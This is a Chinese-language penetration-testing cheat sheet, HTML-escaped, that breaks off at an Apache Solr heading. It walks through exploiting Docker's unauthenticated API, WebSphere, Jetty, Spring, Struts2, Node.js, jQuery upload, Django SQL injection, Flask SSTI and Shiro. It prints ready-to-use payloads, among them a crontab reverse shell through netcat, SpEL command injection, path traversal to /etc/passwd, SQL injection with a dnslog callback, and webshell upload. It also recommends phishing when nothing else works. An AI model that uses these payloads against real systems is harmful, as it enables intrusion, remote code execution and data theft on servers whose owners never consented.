&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt; 如果是在docker内部会有信息返回，否则提示没有此文件夹及文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls -alh /.dockerenv&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在docker内部显示的内容比较多，否则显示的内容比较少&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /proc/1/cgroup &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;docker daemon api 未授权访问漏洞:&lt;/p&gt;
&lt;p&gt;漏洞链接:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvZG9ja2VyL3VuYXV0aG9yaXplZC1yY2UvUkVBRE1FLnpoLWNuLm1k&#34;&gt;https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;利用方法是，我们随意启动一个容器， 并将宿主机的 /etc 目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入 crontab 配置文件，进行反弹 shell。2375 端口开放，并且未授权。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import docker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;client = docker.DockerClient(base_url=&amp;#x27;http://your-ip:2375/&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = client.containers.run(&amp;#x27;alpine:latest&amp;#x27;, r&amp;#x27;&amp;#x27;&amp;#x27;sh -c &amp;quot;echo &amp;#x27;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&amp;#x27; &amp;gt;&amp;gt; /tmp/etc/crontabs/root&amp;quot; &amp;#x27;&amp;#x27;&amp;#x27;, remove=True, volumes=&amp;#123;&amp;#x27;/etc&amp;#x27;: &amp;#123;&amp;#x27;bind&amp;#x27;: &amp;#x27;/tmp/etc&amp;#x27;, &amp;#x27;mode&amp;#x27;: &amp;#x27;rw&amp;#x27;&amp;#125;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;websphere-反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#websphere-反序列化&#34;&gt;#&lt;/a&gt; websphere 反序列化&lt;/h4&gt;
&lt;p&gt;WebSphere® Application Server 加速交付新应用程序和服务，它可以通过快 速交付创新的应用程序来帮助企业提供丰富的用户体验从基于开放标准的丰富 的编程模型中进行选择，更好地协调项目需求与编程模型功能和开发人员技能。&lt;/p&gt;
&lt;p&gt;端口：9080—web (http) 应用访问端口、9443—web (https) 应用访问端口、 9060— 管理后台访问端口、9043— 管理控制台安全端口、8880—SOAP 连接器 端口等等。漏洞探测在 8880 端口，后台是 9060 端口，解析是 9080 端口。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2015-7450&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;后台弱口令上传 webshell，在 6.x 至 7.0 版本，后台登陆只需要输入 admin 作为用户标 识，无需密码，即可登陆后台。其他版本可以尝试 websphere 的默认密码。后台存在文 件上传点，同 tomcat 一样，可用哥斯拉导出 jsp 后门压缩为 zip 后改为 war，再后台上传 并运行。设定目录之后直接解析为 jsp 文件，连接到 webshell。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker pull iscrosales/websphere7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker run -d -p 9060:9060 -p 9043:9043 -p 8880:8880 -p 9080:9080 iscrosales/websphere7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CVE-2015-7450 反序列化 可命令执行直接用exp执行命令&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2020-4450 无利用 POC/EXP&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;jetty-文件读取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jetty-文件读取&#34;&gt;#&lt;/a&gt; jetty 文件读取&lt;/h4&gt;
&lt;p&gt;Elipse Jetty 是一个开源的 servlet 容器，它为基于 Java 的 Web 容器提供运行 环境。此中间件存在文件读取漏洞，但是读取的信息用处不大。&lt;/p&gt;
&lt;p&gt;CVE-2021-28164 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyMy41OC4yMzYuNzY6NjMxMjYvJTJlL1dFQi1JTkYvd2ViLnhtbA==&#34;&gt;http://123.58.236.76:63126/./WEB-INF/web.xml&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;CVE-2021-28169 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyMy41OC4yMzYuNzY6NjMxMjYvc3RhdGljPy9XRUItSU5GL3dlYi54bWw=&#34;&gt;http://123.58.236.76:63126/static?/WEB-INF/web.xml&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;CVE-2021-34429 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyMy41OC4yMzYuNzY6NjMxMjYvJTI1dTAwMmUvV0VCLUlORi93ZWIueG1s&#34;&gt;http://123.58.236.76:63126/%u002e/WEB-INF/web.xml&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;框架安全&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#框架安全&#34;&gt;#&lt;/a&gt; 框架安全&lt;/h3&gt;
&lt;p&gt;根据插件及数据包中识别框架，但是不一定准确，多识别几次确定。&lt;/p&gt;
&lt;h4 id=&#34;thinkphp-laravel&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#thinkphp-laravel&#34;&gt;#&lt;/a&gt; Thinkphp Laravel&lt;/h4&gt;
&lt;p&gt;当确定是 php 框架，直接用集成化工具一把梭。就是一个收集信息，确定 此版本下的漏洞，寻找工具直接利用的一个过程。可以用 GUI_tools 测试。&lt;/p&gt;
&lt;p&gt;Laravel &amp;lt;= 8.4.2 存在 CVE-2021-3129 RCE&lt;/p&gt;
&lt;p&gt;Thinkphp-3.X RCE-5.X RCE 存在 RCE 框架的漏洞是固定的，没有就是没有，自己去挖也不太现实，只能把注意力放在其他的财产目标上；其他的也没漏洞那就只能去社工、钓鱼从管理方面 下手了。&lt;/p&gt;
&lt;h4 id=&#34;spring-struts2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#spring-struts2&#34;&gt;#&lt;/a&gt; Spring Struts2&lt;/h4&gt;
&lt;p&gt;在 java 代码漏洞利用中，需要注意要使用 base64 编码来反弹 shell。原因是 由于 Runtime.getRuntime ().exec () 中不能使用管道符等 bash 需要的方法，故需要 用进行一次编码。&lt;/p&gt;
&lt;p&gt;（1）St2 漏洞&lt;/p&gt;
&lt;p&gt;2020 前漏洞，当识别到一个 url 地址后缀是 action 结尾，就可以尝试用 St2 的集成化工具测试直接 getshell; 后面的版本修复了此漏洞，但有 s2-062 存在 cve_2020_17530、cve_2021_31805，可以直接利用脚本 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1lhbk11&#34;&gt;https://github.com/YanMu&lt;/span&gt; 2020/s2-062 实现 RCE。关于原理与手工复现还是有一定难度的，应该是尽快确 定此框架存在漏洞直接利用。&lt;/p&gt;
&lt;p&gt;（2）Spring 漏洞&lt;/p&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NwcmluZy8lRTMlODAlODI=&#34;&gt;https://vulhub.org/#/environments/spring/。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;cve_2017_4971-Spring Web Flow-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzMyMi8lRTUlQTQlQTclRTglODclQjQlRTYlOTglQUYlRTklODAlOUElRTglQkYlODdTcHJpbmclRTUlOUMlQTg=&#34;&gt;https://paper.seebug.org/322 / 大致是通过 Spring 在&lt;/span&gt; 17 年的默认页面进行操作从而 RCE&lt;/p&gt;
&lt;p&gt;cve_2018_1273-Spring DataCommons - &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NwcmluZy9DVkUtMjAxOC0xMjczLw==&#34;&gt;https://vulhub.org/#/environments/spring/CVE-2018-1273/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;攻击者可以注入恶意 SpEL表达式以执行任意命令，在用户注册界面抓包修改数据，注意不好判断是否RCE，需要dnslog测试/代码全部编码/反弹shell命令编码都进行测试。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;命令注入编码时需要拿出去单独编码防止空格的干扰&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;username[#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;this.getClass().forName(&lt;span class=&#34;string&#34;&gt;&amp;quot;java.lang.Runtime&amp;quot;&lt;/span&gt;).getRuntime().&lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;touch /tmp/success&amp;quot;&lt;/span&gt;)]=&amp;amp;password=&amp;amp;repeatedPassword=&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Spring Data Commons 远程命令执行漏洞（CVE-2018-1273 ）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://vulhub.org/#/environments/spring/CVE-2022-22963/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&amp;quot;touch /tmp/success&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;抓包修改要执行的命令，注意此处不需要编码，其不在post数据中&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;nodejs-jquery&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nodejs-jquery&#34;&gt;#&lt;/a&gt; Node.js Jquery&lt;/h4&gt;
&lt;p&gt;（1）Node.js 目录穿越漏洞（CVE-2017-14849 ）&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;复现地址：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://vulhub.org/#/environments/node/CVE-2017-14849/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用来读取一些敏感文件：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GET /static/../../../a/../../../../etc/passwd HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在node.js &amp;lt;= 8 .5存在此漏洞，如果版本高就不用测了，版本找不到可以直接测&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（2）node.js CVE_2021_21315&lt;/p&gt;
&lt;p&gt;Node.js-systeminformation 是用于获取各种系统信息的 Node.js 模块，在存在命令注入漏洞的版本中，可以通过未过滤的参数中注入 payload 执行系统命令。&lt;br&gt;
Systeminformation &amp;lt; 5.3.1&lt;/p&gt;
&lt;p&gt;复现地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8yODQzNTAuaHRtbA==&#34;&gt;https://www.freebuf.com/vuls/284350.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;git clone https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.git &amp;amp;&amp;amp; node index.js /api/getServices?name[]=$(echo -e &#39;xiaodi&#39; &amp;gt; test.txt)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;（3）jQuery cve_2018_9207 cve_2018_9208 cve_2018_9209&lt;/p&gt;
&lt;p&gt;jQuery 是一个快速、简洁的 JavaScript 框架，如果与 php 配合使用且采用 jq 来传文件，当 jQuery Upload File &amp;lt;= 4.0.2 满足时存在任意文件上传，向 jq 中 post php 可 RCE:&lt;br&gt;
 &lt;code&gt;curl -F &amp;quot;myfile=@php.php&amp;quot; &amp;quot;http://123.58.236.76:56579/jquery-upload-file/php/upload.php&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;django-flask&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#django-flask&#34;&gt;#&lt;/a&gt; Django Flask&lt;/h4&gt;
&lt;p&gt;Django 是一款广为流行的开源 web 框架，由 Python 编写，许多网站和 app 都基于 Django 开发。Django 采用了 MTV 的框架模式，即模型 M，视图 V 和模 版 T，使用 Django，程序员可以方便、快捷地创建高品质、易维护、数据库驱 动的应用程序。而且 Django 还包含许多功能强大的第三方插件，使得 Django 具 有较强的可扩展性。&lt;/p&gt;
&lt;p&gt;前期的信息收集是很重要的，收集到的信息越多，暴露的资产面就越多， 搜集到的框架是 diango 的话就可以着手搜它历年爆出来的 RCE 尝试利用。&lt;/p&gt;
&lt;p&gt;（1）django cve_2019_14234&lt;/p&gt;
&lt;p&gt;注意触发此漏洞的前提条件是需要拿到后台权限，如果不能凭借弱口令或者爆破进入后台，那就不能利用这个漏洞了。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;单引号已注入成功，SQL语句报错&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/admin/vuln/collection/?detail__a%27b=123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;创建cmd_exec&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_exec(cmd_output%20text)--%20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;调用cmd_exec执行命令，用dnslog接收回显判断是否存在命令执行：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_exec%20FROM%20PROGRAM%20%27ping hqrwsz.dnslog.cn%27--%20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（2）django CVE-2021-35042&lt;/p&gt;
&lt;p&gt;漏洞复现：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8yODMyNjIuaHRtbA==&#34;&gt;https://www.freebuf.com/vuls/283262.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Django 组件存在 SQL 注入漏洞，该漏洞是由于对 QuerySet.order_by () 中用户提供数据的过滤不足，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行 SQL 注入攻击，最终造成服务器敏感信息泄露。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;找到可以进行数据注入的地方，进行构造，直接注入获取敏感信息。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@basedir)),1)%23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20version())),1)%23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20database())),1)%23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（3）Django SQL 注入漏洞 CVE-2022-28346&lt;/p&gt;
&lt;p&gt;攻击者使用精心编制的字典， 通过 kwargs 传递给 QuerySet.annotate ()、aggregate () 和 extra () 这些方法，可导致这些方法在列别名中受到 SQL 注入攻击。&lt;/p&gt;
&lt;p&gt;漏洞复现：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NzU2NzY1NS9hcnRpY2xlL2RldGFpbHMvMTI1NjIzNzg0&#34;&gt;https://blog.csdn.net/weixin_57567655/article/details/125623784&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;通过报错页面可以发现存在哪些接口，访问接口如果存在传参，同样会提示报错信息&lt;/p&gt;
&lt;p&gt;使用报错提示的参数进行 sql 注入：&lt;br&gt;
 &lt;code&gt;http://x.x.x.x:8000/demo?field=demo.name&amp;quot;FROM &amp;quot;demo_user&amp;quot; union SELECT &amp;quot;1&amp;quot;,sqlite_version(),&amp;quot;3&amp;quot; --&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;（4）flask SSTI 模板注入&lt;/p&gt;
&lt;p&gt;复现地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2ZsYXNrL3NzdGkv&#34;&gt;https://vulhub.org/#/environments/flask/ssti/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;访问 http://your-ip/?name=54289，得到 54289 ，说明 SSTI 漏洞存在。&lt;/p&gt;
&lt;p&gt;可尝试执行命令，反弹 shell 等操作。一般参数为默认的 404_url 和 name，如果无法确定参数的话需要用字典进行测试。&lt;/p&gt;
&lt;h4 id=&#34;shiro-sorl&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#shiro-sorl&#34;&gt;#&lt;/a&gt; Shiro Sorl&lt;/h4&gt;
&lt;p&gt;（1）Apache Shiro 漏洞&lt;/p&gt;
&lt;p&gt;Apache Shiro 是一个强大且易用的 Java 安全框架，用于身份验证、授权、密码和会话管理。&lt;/p&gt;
&lt;p&gt;判断：大多会发生在登录处，返回包里包含 remeberMe=deleteMe 字段&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;apache shiro的历史漏洞如下，作简单了解：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Apache Shiro &amp;lt;= 1.2.4 默认密钥致命令执行漏洞【CVE-2016-4483 】&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Apache Shiro &amp;lt; 1.3.2 验证绕过漏洞【CVE-2016-2807 】&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Apache Shiro &amp;lt; 1.4.2 cookie oracle padding漏洞 【CVE-2019-12442 】&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Apache Shiro &amp;lt; 1.5.2 验证绕过漏洞 【CVE-2020-1957 】&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Apache Shiro &amp;lt; 1.5.3 验证绕过漏洞 【CVE-2020-11989 】&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Apahce Shiro &amp;lt; 1.6.0 验证绕过漏洞 【CVE-2020-13933 】&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Apahce Shiro &amp;lt; 1.7.1 权限绕过漏洞 【CVE-2020-17523 】&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;CVE_2016_4437 Shiro-550+Shiro-721&lt;br&gt;
 用工具直接爆破出密钥，在继续执行命令，但是已经很老，很难碰到&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CVE-2020-11989&lt;br&gt;
Poc：/admin/%20 影响范围：Apache Shiro &amp;lt; 1.7.1&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2p3ZW55L3NoaXJvLWN2ZS0yMDIwLTE3NTIz&#34;&gt;https://github.com/jweny/shiro-cve-2020-17523&lt;/span&gt;&lt;br&gt;
 当看到当前 java 引入了 shiro 依赖，切其版本在指定范围内就可以进行测试&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CVE-2020-1957&lt;br&gt;
Poc：/xxx/…;/admin/ 影响范围：Apache Shiro &amp;lt; 1.5.3&lt;br&gt;
 验证绕过，访问构造的地址构造恶意 url 地址之后可以跳过登录认证，如何获取这个 url 地址可以拿到源码构造可以在线搜索或者抓包进行寻找。实际出现了 shiro 这个版本再去想找相应的利用方法。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;（2）Apache Solr 漏洞&lt;/p&gt;
